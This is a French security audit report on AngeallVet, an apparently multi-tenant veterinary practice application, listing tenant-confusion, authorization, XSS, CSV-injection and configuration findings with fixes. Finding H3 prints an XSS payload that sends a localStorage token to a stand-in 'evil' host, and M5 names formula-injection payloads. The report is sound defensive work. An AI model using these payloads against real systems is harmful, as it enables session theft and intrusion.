# Audit de sécurité AngeallVet — juillet 2026

- **Date** : 2026-07-01
- **Périmètre** : backend FastAPI + frontend React, avec un focus sur le **code postérieur au 2026-06-29** (sync Google, échelons de commission, comptabilité, vaccins, seat-cap/licensing) — jamais audité auparavant.
- **Ligne de base** : dernier durcissement `be096d9` (« fix(security): harden tenant isolation, auth and secrets at rest », 2026-06-29). Vérifié : il **tient** et n'a pas régressé.
- **Méthode** : 6 revues parallèles en lecture seule (isolation tenant/auth · RBAC/IDOR · licensing/facturation · injection · endpoints publics/crypto · frontend/deps). Chaque finding a été confirmé sur le code réel ; les bypass JWT (licence + auth) ont été **testés empiriquement** contre les libs épinglées (PyJWT 2.13.0, cryptography ≥43).
- **Statut** : findings **ouverts** (aucun correctif appliqué à la date du rapport).

## Verdict

Le **cœur cryptographique est sain** : isolation par secret dérivé par tenant, licence Ed25519 réellement infalsifiable, chiffrement au repos (quand configuré), RBAC correct là où il est appliqué. Les risques se concentrent sur **quatre axes** :

1. **Le périmètre fait confiance à des en-têtes clients** (`X-Tenant-Slug`, `X-Forwarded-Host`) que Caddy ne filtre pas.
2. **L'autorisation est incomplète** : la matrice de permissions n'est pas appliquée côté serveur ; des gates/validations manquent sur les endpoints neufs et financiers.
3. **Des footguns de configuration échouent *ouvert*** (`APP_ENV`, `ENCRYPTION_KEY`).
4. **Du durcissement manque** : rate-limiting, en-têtes HTTP de sécurité, XSS dans les helpers d'impression.

**Bilan : 1 Critique · 8 Élevés · 7 Moyens · 6 Faibles.**

---

## 🔴 Critique

### C1 — Confiance aux en-têtes `X-Tenant-Slug` / `X-Forwarded-Host` (confusion de tenant)

- **Fichiers** : `backend/app/main.py:39-41`, `backend/app/core/tenancy.py:159-163`, `Caddyfile:28`
- **Constat** : `TenantMiddleware` résout le tenant depuis `X-Tenant-Slug` (prioritaire sur le Host) ou `X-Forwarded-Host`. Le Caddyfile (`handle /api/*` → `reverse_proxy backend:8000`) **ne supprime aucun en-tête entrant** : les deux sont contrôlables depuis Internet. Le client sélectionne donc entièrement le `TenantContext` (DB, PocketBase, secret JWT, **modules**, seat-cap).
- **Exploitation** : router un login/`/auth/session` vers le PocketBase d'un autre tenant ; transformer les endpoints publics (flux iCal) en **oracle cross-tenant** ; influencer la porte de modules ; contourner un WAF/monitoring par sous-domaine.
- **Nuance** : les lectures **authentifiées** cross-tenant restent bloquées par le secret-par-tenant (un token A échoue sous B) et les tokens iCal sont en 256 bits — ce n'est donc pas un dump trivial. Mais devient **réellement critique** combiné à H6 (secret par défaut → forge de tokens). Correctif simple, non discutable.
- **Correctif** : supprimer l'override `X-Tenant-Slug` (ou le réserver au réseau interne / platform-admin) ; ajouter `TrustedHostMiddleware` (allow-list `*.BASE_DOMAIN`) ; dans Caddy `header_up -X-Tenant-Slug` et `header_up X-Forwarded-Host {host}`.

---

## 🟠 Élevé

### H1 — Matrice de permissions jamais appliquée côté serveur
- **Fichiers** : `backend/app/models/user.py:18-49` + tous les endpoints en `Depends(get_current_user)` seul.
- **Constat** : `DEFAULT_PERMISSIONS` et les surcharges `RolePermission` ne sont **que renvoyés au SPA** (`/auth/permissions/me`), jamais vérifiés. Le seul RBAC serveur est `require_roles(...)`.
- **Exploitation** : un rôle `guest`/`accountant` (censé être en lecture très limitée) peut **écrire** clients, paiements, mouvements de stock, règles de communication, etc. en appelant l'API directement (le front ne fait que masquer la nav).
- **Correctif** : introduire une dépendance `require_permission("clients"…)` qui consulte réellement la matrice, ou poser `require_roles(...)` sur chaque écriture. Exclure au minimum `guest`/`accountant` des écritures cliniques/stock.

### H2 — Montants monétaires sans contrainte + paiement non gardé
- **Fichiers** : `backend/app/schemas/billing.py:8-16,116-121` (aucun validateur), `backend/app/api/endpoints/billing.py:255-292`, `backend/app/core/commissions.py:180`.
- **Constat** : `PaymentCreate.amount`, `InvoiceLineCreate.unit_price`, `quantity`, `discount_percent` sont des `Decimal` libres ; `POST /billing/payments` n'a aucun gate de rôle.
- **Exploitation** (tout utilisateur connecté, y c. `guest`) : paiement **négatif** → réduit `amount_paid`, rend la commission d'un confrère négative, fausse le Z-report ; **sur-paiement** → crédite `client.account_balance` ; ligne à `unit_price` négatif ou `discount_percent > 100` → total/commission négatifs, voire overflow `Numeric(10,2)`.
- **Correctif** : `condecimal(gt=0)` / `ge=0, le=100` sur les schémas ; gate de rôle sur `record_payment` ; plafonner au reste dû avant de muter `amount_paid`/`account_balance`.

### H3 — XSS stockée via `document.write` (impressions)
- **Fichiers** : `frontend/src/pages/DashboardPage.jsx:50-70` (rappels postaux), `frontend/src/pages/InvoiceDetailPage.jsx:215-276` (reconnaissance de dette).
- **Constat** : nom client/clinique (free-text, éditables par le staff) interpolés bruts dans une chaîne HTML écrite via `document.write`. Seuls sinks d'injection HTML du front (le reste est du JSX auto-échappé ; aucun `dangerouslySetInnerHTML`/`innerHTML`/`eval`).
- **Exploitation** : un nom `<img src=x onerror=fetch('//evil/?t='+localStorage.app_token)>` s'exécute **dans le navigateur de l'admin** qui imprime → vol du token (stocké en `localStorage`) = vol de session, escalade intra-tenant.
- **Correctif** : échapper `& < > " '` avant interpolation (après substitution des placeholders `{client_name}`…), ou construire le DOM via `createElement`/`textContent`.

### H4 — `prescribing_vet_id` falsifiable sur le registre des stupéfiants (réglementaire)
- **Fichiers** : `backend/app/api/endpoints/controlled_substances.py:140-185`, `backend/app/schemas/controlled_substance.py:15`.
- **Constat** : l'endpoint est bien limité à admin/vétérinaire, mais le handler fait `data.prescribing_vet_id or current_user.id` — un appelant peut attribuer une dispensation/destruction de stupéfiants à **un confrère** sur un registre légal (et son export CSV).
- **Correctif** : ignorer `prescribing_vet_id` fourni par le client pour les non-admins (forcer `current_user.id`) ; sinon valider + tracer l'opérateur réel séparément.

### H5 — `ENCRYPTION_KEY` non défini → secrets stockés en clair, sans échec
- **Fichiers** : `backend/app/core/crypto.py:23-33`, `backend/app/main.py:215-218`.
- **Constat** : `EncryptedSecret` ne chiffre **que si** `ENCRYPTION_KEY` est présent, sinon stocke/lit en clair. En prod sans clé : `tenants.database_url` (mot de passe DB), `pb_admin_password` et les **refresh tokens Google** sont en clair. Le démarrage se contente d'un *warning* (contrairement à `APP_SECRET_KEY` qui échoue fermé).
- **Exploitation** : fuite de dump/backup → identifiants DB tenant + tokens OAuth Google en clair.
- **Correctif** : `raise` (fail-closed) en prod si `ENCRYPTION_KEY` est vide, comme pour `APP_SECRET_KEY`.

### H6 — `APP_ENV=development` par défaut (footgun de configuration)
- **Fichiers** : `backend/app/core/config.py:9,122-124`, `.env.example`, `backend/app/core/licensing.py:115-124`, `backend/app/main.py:209-214`.
- **Constat** : `APP_ENV` défaut `"development"` et `.env.example` le livre ainsi. `is_dev_env` (a) saute le garde-fou du secret par défaut, (b) **débloque tous les modules payants** sans licence, (c) expose Swagger/OpenAPI.
- **Exploitation** : un déployeur qui oublie de basculer `APP_ENV=production` tourne avec l'`APP_SECRET_KEY` publié → `derive_tenant_secret` connu → **forge de JWT pour n'importe quel tenant/utilisateur** (rayon de souffle total) + modules gratuits + docs exposées.
- **Correctif** : défaut `production` ; livrer `.env.example` en `production` ; exécuter le check du secret par défaut dans **tous** les environnements sauf dev+localhost explicite ; refuser de démarrer si `APP_SECRET_KEY`/`ENCRYPTION_KEY` sont les valeurs par défaut en non-dev.

### H7 — Aucun rate-limiting
- **Constat** : aucun throttle (`slowapi`/limiter absent) sur `POST /auth/login` & `/auth/session` (oracle de mot de passe, credential-stuffing) ni sur `GET /agenda/ical/{token}.ics` (devinette de token).
- **Correctif** : `slowapi` (ou `rate_limit` Caddy) sur login/session + le chemin iCal.

### H8 — Flux iCal public : fuite de PII large et permanente
- **Fichiers** : `backend/app/api/endpoints/agenda.py:149-199`.
- **Constat** : jusqu'à 2000 RDV avec **nom+prénom client, nom animal, motif, adresse/ville de la clinique** sur une URL non authentifiée, **sans expiration** (RGPD). Le token est solide (`secrets.token_urlsafe(32)`, 256 bits) et révocable/rotable, mais le contenu est très bavard.
- **Correctif** : signer l'URL avec expiration, ou réduire la PII exposée (motif, nom complet) ; rate-limiter ; garder le module-gate (présent).

---

## 🟡 Moyen

### M1 — Attribution vétérinaire des factures non gardée (fraude à la commission)
`backend/app/api/endpoints/billing.py:197,216` — `add/remove_invoice_veterinarian` sans gate ni contrôle de propriété : un non-admin s'ajoute sur des factures à forte valeur pour gonfler sa commission (ou retire un confrère). **Fix** : gate `admin` (et/ou le vet créateur de la facture).

### M2 — `POST /vaccinations` accepte n'importe quel rôle
`backend/app/api/endpoints/vaccination.py:168` — un acte vétérinaire (attribué à `current_user.id`) est enregistrable par guest/assistant/comptable contre n'importe quel `animal_id`. La config des protocoles, elle, est bien `admin`-only. **Fix** : `require_roles(ADMIN, VETERINARIAN)` sur l'enregistrement (miroir de `medical.create_record`).

### M3 — Caisse : `business_date` arbitraire
`backend/app/api/endpoints/accounting.py:47,52,128,150` — `MovementIn`/`CloseIn.business_date` client-fournis, non bornés (seul le jour *déjà clôturé* est protégé). Écritures rétroactives (jour passé non clôturé) ou futures → masquer un manquant de caisse ; `opening/counted_amount` libres → `discrepancy` entièrement pilotée par l'opérateur. **Fix** : refuser passé/futur (ou antérieur à la dernière clôture) ; clôtures strictement séquentielles ; horodater la date *système* séparément.

### M4 — Seat-cap : course TOCTOU
`backend/app/api/endpoints/auth.py:91` — `count() >= max_users` puis `add/commit` non atomiques, sans verrou : des `register` concurrents à `cap-1` dépassent le plafond licencié. **Fix** : `SELECT … FOR UPDATE` sur un compteur, advisory-lock Postgres par tenant, ou contrainte DB.

### M5 — Injection de formule CSV dans l'export du registre stupéfiants
`backend/app/api/endpoints/controlled_substances.py:210-238` — `csv.writer` sans neutraliser les cellules commençant par `= + - @` (tab/CR). L'export XLSX, lui, passe par `excel._cell()` (`backend/app/core/excel.py:47-49`) qui le fait ; le CSV le contourne. Un `notes`/`reason`/`patient_owner_name` piégé exécute une formule à l'ouverture par l'admin/comptable (`=HYPERLINK(...)`, DDE `=cmd|...`). **Fix** : router chaque cellule par un `_csv_safe()` (préfixer un espace si le 1ᵉʳ car ∈ `=+-@\t\r`) ; `QUOTE_ALL`.

### M6 — Aucun en-tête HTTP de sécurité
Ni l'app ni Caddy n'émettent HSTS, CSP, X-Frame-Options, X-Content-Type-Options — notable pour un PMS santé/PII (clickjacking, downgrade). **Fix** : bloc `header { … }` dans Caddy.

### M7 — Fallback « default tenant » fail-open
`backend/app/core/tenancy.py:146-156`, `backend/app/core/database.py:82-84` — un Host inconnu (ou une **erreur DB registre**, avalée) retombe sur le default tenant, dont `db_url=None` → **base centrale**. Un défaut transitoire dégrade silencieusement chaque tenant vers default. **Fix** : Host non résolu = 404/400 dur en prod ; ne jamais retomber sur default en cas d'exception (fail-closed) ; distinguer « single-clinic légitime » de « host non reconnu ».

---

## ⚪ Faible

- **L1 — JWT sans `aud`/`iss`/`tid`** (`backend/app/core/security.py:38-83`) : l'isolation repose entièrement sur le secret par tenant (sain aujourd'hui), sans 2ᵉ ligne. → ajouter `"tid": slug` + assertion `payload["tid"] == tenant.slug` dans `verify_app_token`.
- **L2 — `id_token` Google décodé sans vérif de signature** (`backend/app/core/google_calendar.py:99-111`) : sûr *tel qu'utilisé* (source TLS serveur-à-serveur, `google_email` display-only), latent si réutilisé sur un token client. → vérifier via JWKS ou rendre le contrat « trusted-source only » explicite.
- **L3 — Erreurs upstream Google renvoyées telles quelles** (`backend/app/api/endpoints/agenda.py:452`, `google_calendar.py:60,134`) : `detail=f"Google: {exc}"` / `last_error` → divulgation d'infos internes. → message générique, log serveur.
- **L4 — FEC : séparateurs non neutralisés** (`backend/app/core/accounting_export.py:105-140`) : champs `String` joints par `\t` sans strip `\t\r\n` → corruption d'alignement TSV via `invoice_number`/nom client. → `_fec_cell()` remplace les séparateurs.
- **L5 — Token app en `localStorage`** (`frontend/src/services/api.js:9-16`) : trade-off SPA standard (correctement purgé au logout), mais amplifie H3. → optionnel : JWT en mémoire, re-minté depuis la session PB au reload.
- **L6 — `cryptography>=43.0.0` non épinglé** (`backend/requirements.txt`) : seul floor `>=` (le reste est `==`) → builds non reproductibles. → figer en `==` connu-bon.

---

## ✅ Vérifié solide (couverture)

- **Licence Ed25519 réellement vérifiée** : `jwt.decode(..., algorithms=["EdDSA"])` ; testé — `alg=none` → `InvalidAlgorithmError`, confusion HS256/clé-publique → `InvalidKeyError`, expiré → `ExpiredSignatureError`. Liée au slug (`sub`), re-vérifiée à `PUT /tenants/{id}/license`. Échoue **fermé**. `verify_signature=False` utilisé uniquement dans la CLI `inspect` (n'accorde rien).
- **JWT applicatif** : `alg` épinglé (HS256), `exp` appliqué (PyJWT 2.13), secret **dérivé par tenant** (HMAC-SHA256, jamais stocké) → un token A n'est pas valide sous B.
- **PocketBase** : token **vérifié serveur** via `auth-refresh` ; relink email exige `verified=true` (bloque la prise de compte via signup public).
- **Registre/plateforme** : `/auth/tenants*` en `require_platform_admin` (`hmac.compare_digest`, fail-closed) ; `TenantResponse` omet `database_url`/`pb_admin_password`.
- **Seat-cap** appliqué **avant** tout effet de bord PocketBase ; `register` admin-only.
- **Gates de modules** serveur & cohérents (`accounting`, `google_calendar`, `invoice_ninja`, `vaccine_protocols`, `sms`) ; clés ⊂ `ALL_MODULES` ; aucune fonctionnalité gardée ne repose sur le front seul.
- **Verrou de caisse** non contournable par backdating de paiement (`payment_date` forcé à `date.today()`).
- **Injection** : recherche pg_trgm (ORM `ilike` bindé), DDL `_ensure_schema`/`db_indexes` (littéraux constants), routage tenant (`getattr` sur champs hardcodés, valeurs bindées) → **non injectables**. iCal échappé (RFC 5545), PDF fpdf2 encodé, exports XLSX neutralisés (`_cell`, `_safe_title`, filename scrubbé).
- **OAuth Google** : `state` signé + lié au véto/tenant + `scope` (CSRF OK) ; **pas d'open-redirect** (redirection vers `FRONTEND_URL` serveur) ; **pas de SSRF** (endpoints Google hardcodés).
- **Frontend** : CSRF **N/A** (bearer en header, jamais `withCredentials`) ; **aucun secret** dans le bundle (seuls `VITE_API_URL`/`VITE_POCKETBASE_URL`) ; module-gating UX-only confirmé ; cache offline IndexedDB namespacé par tenant, purgé au logout.
- **Dépendances** : `npm audit --omit=dev` → **0 vuln** (axios 1.18.1, vite 8.1.0, react-router 6.30.4, pocketbase 0.27.0…) ; backend patché (pyjwt 2.13, fastapi 0.138.2, sqlalchemy 2.0.51, python-multipart 0.0.32 > fix CVE-2024-53981, Pillow 12.2, jinja2 3.1.6).
- **`APP_SECRET_KEY` par défaut** : **échoue fermé** au démarrage en prod (`main.py:210-214`). Swagger désactivé hors dev. Handler d'exception global générique (pas de stack trace client).

---

## Plan de remédiation

| Lot | Contenu | Effort | Impact |
|---|---|---|---|
| **1 — Périmètre** | C1 (Caddy strip en-têtes + `TrustedHostMiddleware`), H5 + H6 (fail-closed `ENCRYPTION_KEY`/`APP_ENV`), M6 (en-têtes HTTP), M7 (fail-closed default tenant) | Faible | Très fort |
| **2 — AuthZ & finance** | H1 (matrice de permissions), H2 (contraintes montants + gate paiement), H4 (prescribing_vet), M1 (attribution facture), M2 (plancher vaccins), M3 (business_date), M4 (seat-cap) | Moyen | Fort |
| **3 — Durcissement** | H3 (échappement impressions), H7 (rate-limit), H8 (PII iCal), M5 (CSV), L1–L6 | Moyen | Moyen |

La majorité des correctifs sont petits et couverts par des tests existants (RBAC, billing, licensing). Livraison suggérée : branche `security/hardening-2026-07`, un commit par lot, chacun avec ses tests.

### À confirmer (hors code, infra)
- **C1/H6** : configuration Caddy en production (strip des en-têtes) et valeur réelle d'`APP_ENV` sur les déploiements.
- **M4** : la prod tourne-t-elle plusieurs workers (probabilité réelle de la course) ?
- **H1** : intention produit — `accountant`/`guest` doivent-ils vraiment être en lecture seule ? (définit la matrice à appliquer).

---

*Rapport généré par un audit multi-agents (6 domaines en parallèle), en lecture seule. Aucun code modifié.*
